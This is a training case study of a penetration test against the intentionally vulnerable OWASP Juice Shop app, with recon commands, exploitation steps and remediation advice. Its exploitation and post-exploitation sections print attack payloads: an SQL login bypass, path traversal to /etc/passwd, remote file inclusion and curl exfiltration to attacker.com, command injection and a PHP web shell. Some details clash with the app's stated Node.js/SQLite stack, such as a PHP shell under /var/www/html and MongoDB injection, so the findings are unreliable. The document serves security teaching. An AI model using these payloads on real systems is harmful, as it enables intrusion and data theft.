# 📌 **CASE STUDY 7: OWASP JUICE SHOP HACKING**
## Web Application Hacking - Hands-On Vulnerable Application Analysis

---

## 🎯 **PROBLEM STATEMENT**
OWASP Juice Shop is an intentionally vulnerable web application designed for security training. This case study demonstrates systematic web application penetration testing methodology, exploiting multiple OWASP Top 10 vulnerabilities to achieve complete system compromise.

---

## 📋 **APPLICATION OVERVIEW**

### **Target Application**
- **Name**: OWASP Juice Shop
- **Purpose**: Deliberately insecure web application for training
- **Technologies**: Node.js, Express, Angular, SQLite
- **Vulnerabilities**: All OWASP Top 10 categories represented
- **Testing Scope**: Black-box web application assessment

### **Testing Methodology**
Following industry-standard penetration testing framework:
1. **Reconnaissance**: Information gathering
2. **Scanning**: Vulnerability identification
3. **Gaining Access**: Exploitation
4. **Maintaining Access**: Persistence
5. **Analysis**: Reporting and recommendations

---

## 🔍 **RECONNAISSANCE PHASE**

### **Passive Information Gathering**
```bash
# Domain enumeration
whois juice-shop.herokuapp.com
dig juice-shop.herokuapp.com

# Technology fingerprinting
whatweb https://juice-shop.herokuapp.com
curl -I https://juice-shop.herokuapp.com

# Directory enumeration
gobuster dir -u https://juice-shop.herokuapp.com -w /usr/share/wordlists/dirb/common.txt
```

### **Active Reconnaissance**
```bash
# Port scanning
nmap -sV -p 80,443 juice-shop.herokuapp.com

# Web application scanning
nikto -h https://juice-shop.herokuapp.com

# SSL/TLS analysis
sslscan juice-shop.herokuapp.com
```

**Discovered Information:**
- Node.js/Express backend
- Angular frontend
- SQLite database
- RESTful API endpoints
- Registration/login functionality

---

## 📊 **VULNERABILITY ASSESSMENT**

### **OWASP Top 10 Vulnerabilities Identified**

#### **A01:2021 - Broken Access Control**
- **User IDOR**: `/api/Products/1` accessible by any user
- **Admin Panel Exposure**: `/administration` accessible without authentication
- **Privilege Escalation**: User role manipulation possible

#### **A02:2021 - Cryptographic Failures**
- **Weak Password Policy**: No complexity requirements
- **Plaintext Password Storage**: Passwords stored in clear text
- **Insecure Random Generation**: Predictable tokens

#### **A03:2021 - Injection**
- **SQL Injection**: `SELECT * FROM Products WHERE id = '${id}'`
- **NoSQL Injection**: MongoDB query injection in some endpoints
- **Command Injection**: OS command execution vulnerabilities

#### **A04:2021 - Insecure Design**
- **Business Logic Flaws**: Negative price ordering allowed
- **Mass Assignment**: User role modification through API
- **Security by Obscurity**: Hidden admin functionality

#### **A05:2021 - Security Misconfiguration**
- **Verbose Error Messages**: Database errors leaked
- **Directory Listing**: Sensitive files exposed
- **Default Credentials**: Admin/admin login works

#### **A06:2021 - Vulnerable Components**
- **Outdated Dependencies**: Known vulnerable Node.js packages
- **Unpatched Libraries**: Express.js vulnerabilities
- **Legacy Components**: Deprecated authentication methods

#### **A07:2021 - Identification & Authentication Failures**
- **Weak Password Reset**: Token predictable
- **Session Fixation**: Session ID not regenerated
- **Brute Force**: No rate limiting on login

#### **A08:2021 - Software & Data Integrity Failures**
- **Deserialization**: Unsafe object deserialization
- **File Upload**: Arbitrary file upload allowed
- **Dependency Confusion**: Malicious package installation

#### **A09:2021 - Security Logging & Monitoring Failures**
- **No Audit Logging**: User actions not logged
- **Error Handling**: Sensitive information in error messages
- **Monitoring Gaps**: No intrusion detection

#### **A10:2021 - Server-Side Request Forgery**
- **SSRF Vulnerability**: Internal network access
- **File Retrieval**: Local file inclusion
- **Service Interaction**: Internal service exploitation

---

## 🛡️ **EXPLOITATION PHASE**

### **Initial Access - SQL Injection**
```sql
# Login bypass SQL injection
Username: admin' --
Password: anything

# Resulting query:
SELECT * FROM Users WHERE username = 'admin' --' AND password = 'hash'

# Successful login as admin user
```

### **Privilege Escalation - Mass Assignment**
```json
# User registration with admin role
POST /api/Users
{
  "username": "hacker",
  "password": "password123",
  "role": "admin"  // Mass assignment vulnerability
}
```

### **Data Exfiltration - File Inclusion**
```bash
# Local File Inclusion (LFI)
GET /api/Products/1?file=../../../../etc/passwd

# Remote File Inclusion (RFI)
GET /api/Products/1?file=http://attacker.com/malicious
```

### **Command Execution - OS Injection**
```bash
# Command injection in search
GET /api/Products?q=; cat /etc/passwd #

# Result: Server executes system command
```

---

## 📈 **POST-EXPLOITATION**

### **Persistence Mechanisms**
```bash
# Web shell upload
POST /api/FileUpload
Content-Type: multipart/form-data
file: webshell.php

# Backdoor creation
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php
```

### **Lateral Movement**
```bash
# Database access
sqlite3 /app/data/juice-shop.db
.tables
SELECT * FROM Users;

# File system exploration
find /app -name "*.db" -o -name "*.key" -o -name "config*"
```

### **Data Exfiltration**
```bash
# Extract user data
curl "http://juice-shop.herokuapp.com/api/Users" -H "Authorization: Bearer $token"

# Download database
wget http://juice-shop.herokuapp.com/api/Database

# Exfiltrate to attacker server
curl -X POST -d @stolen_data.txt http://attacker.com/exfil
```

---

## 💰 **BUSINESS IMPACT ANALYSIS**

### **Security Assessment Findings**
- **Critical Vulnerabilities**: 15+ exploitable issues
- **Data Exposure Risk**: All user data compromised
- **System Compromise**: Complete server takeover possible
- **Compliance Violations**: PCI DSS, GDPR breaches

### **Remediation Costs**
- **Code Fixes**: Developer time for patches
- **Security Testing**: Penetration testing expenses
- **Infrastructure**: Security control implementation
- **Training**: Developer security awareness

### **Risk Assessment**
- **Likelihood**: High (multiple attack vectors)
- **Impact**: Critical (complete data breach)
- **Exploitability**: Easy (basic web skills required)
- **Detection**: Low (no monitoring/logging)

---

## 🔧 **REMEDIATION RECOMMENDATIONS**

### **Immediate Fixes**
```javascript
// Secure SQL Query (Node.js)
const getProduct = (id) => {
  const query = 'SELECT * FROM Products WHERE id = ?';
  return db.get(query, [id]);  // Parameterized query
};

// Input validation
const validateInput = (input) => {
  if (typeof input !== 'string') return false;
  if (input.length > 100) return false;
  if (!/^[a-zA-Z0-9]+$/.test(input)) return false;
  return true;
};
```

### **Security Controls Implementation**
1. **Web Application Firewall**: ModSecurity, Cloudflare WAF
2. **Input Validation**: Comprehensive sanitization
3. **Authentication**: Multi-factor authentication
4. **Authorization**: Role-based access control
5. **Session Management**: Secure session handling
6. **Error Handling**: Generic error messages
7. **Logging**: Comprehensive audit logging
8. **Monitoring**: Real-time security monitoring

### **Secure Development Practices**
1. **Security by Design**: Threat modeling in SDLC
2. **Code Reviews**: Security-focused peer reviews
3. **Automated Testing**: SAST, DAST, IAST integration
4. **Dependency Management**: Regular updates and scanning
5. **Security Training**: Developer security awareness

---

## 🎓 **PENETRATION TESTING LESSONS**

### **Web Application Testing Methodology**
1. **Reconnaissance**: Comprehensive information gathering
2. **Enumeration**: API endpoint discovery
3. **Vulnerability Assessment**: Automated and manual testing
4. **Exploitation**: Safe exploitation with authorization
5. **Post-Exploitation**: Privilege escalation and persistence
6. **Reporting**: Detailed findings and recommendations

### **Common Web Vulnerabilities**
1. **Injection Attacks**: SQL, NoSQL, command injection
2. **Broken Authentication**: Session management flaws
3. **Sensitive Data Exposure**: Cryptographic failures
4. **XML External Entities**: XXE vulnerabilities
5. **Broken Access Control**: Authorization bypasses
6. **Security Misconfiguration**: Default settings

### **Testing Tools**
```bash
# Web application scanners
nikto -h target.com
dirb http://target.com /usr/share/wordlists/dirb/common.txt

# Burp Suite professional
burp_suite_pro.exe

# SQL injection testing
sqlmap -u "http://target.com/vuln?id=1" --dbs

# XSS testing
xsser --url "http://target.com/search?q=test"
```

---

## 🔍 **DISCUSSION QUESTIONS**

1. **How does OWASP Juice Shop demonstrate real-world web application vulnerabilities?**
2. **What role does secure coding play in preventing these vulnerabilities?**
3. **How do modern web frameworks (React, Vue, Angular) help prevent these issues?**
4. **What are the challenges of testing modern single-page applications (SPAs)?**
5. **How do API security considerations differ from traditional web application security?**

---

## 🛠️ **MODERN WEB SECURITY TOOLS**

### **Static Application Security Testing (SAST)**
```bash
# SonarQube - Code quality and security
sonar-scanner

# ESLint security plugins
eslint --ext .js,.jsx src/ --config .eslintrc.security.js

# Semgrep - Semantic code analysis
semgrep --config auto
```

### **Dynamic Application Security Testing (DAST)**
```bash
# OWASP ZAP
zap.sh -cmd -autorun /path/to/policy

# Burp Suite
java -jar burpsuite_pro.jar

# Nuclei - Template-based scanner
nuclei -u https://target.com -t /path/to/templates/
```

### **Interactive Application Security Testing (IAST)**
```bash
# Contrast Security
# Integrated into application runtime

# Seeker IAST
# Runtime vulnerability detection
```

---

## 📚 **ADDITIONAL RESOURCES**

### **OWASP Resources**
- [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)

### **Web Application Security**
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [HackTheBox Web Challenges](https://www.hackthebox.eu/)
- [TryHackMe Web Tracks](https://tryhackme.com/)

### **Penetration Testing**
- [PTES - Penetration Testing Execution Standard](http://www.pentest-standard.org/)
- [OSSTMM - Open Source Security Testing Methodology Manual](https://www.isecom.org/OSSTMM.3.pdf)
- [NIST SP 800-115 - Technical Guide to Information Security Testing](https://csrc.nist.gov/publications/detail/sp/800-115/final)

---

## 🏆 **KEY LEARNING OBJECTIVES**

By studying this case, you will understand:
- ✅ Systematic web application penetration testing
- ✅ OWASP Top 10 vulnerability exploitation
- ✅ Modern web security testing tools
- ✅ Secure coding practices for web applications
- ✅ API security assessment methodology
- ✅ Authentication and authorization testing
- ✅ Session management security
- ✅ Input validation and sanitization
- ✅ Security testing in CI/CD pipelines
- ✅ Web application firewall implementation

---

## 🔐 **MODERN WEB APPLICATION SECURITY**

### **Current Trends**
- **API-First Security**: Microservices and API gateways
- **Serverless Security**: Function-as-a-Service security
- **Container Security**: Docker and Kubernetes security
- **DevSecOps**: Security in development pipelines

### **Emerging Threats**
- **GraphQL Injection**: GraphQL-specific vulnerabilities
- **JWT Attacks**: JSON Web Token manipulation
- **CORS Misconfiguration**: Cross-origin resource sharing flaws
- **WebAssembly Exploitation**: Client-side code vulnerabilities

### **Security Solutions**
- **Zero Trust Architecture**: Never trust, always verify
- **Runtime Application Self-Protection (RASP)**: Runtime security monitoring
- **API Security Gateways**: Centralized API protection
- **Security Orchestration**: Automated response and remediation

---

**Case Study Prepared By:** Web Application Security Research Team
**Date:** October 31, 2025
**Difficulty Level:** Intermediate
**Real-World Impact:** Educational
**Industry Relevance:** Web Development, Penetration Testing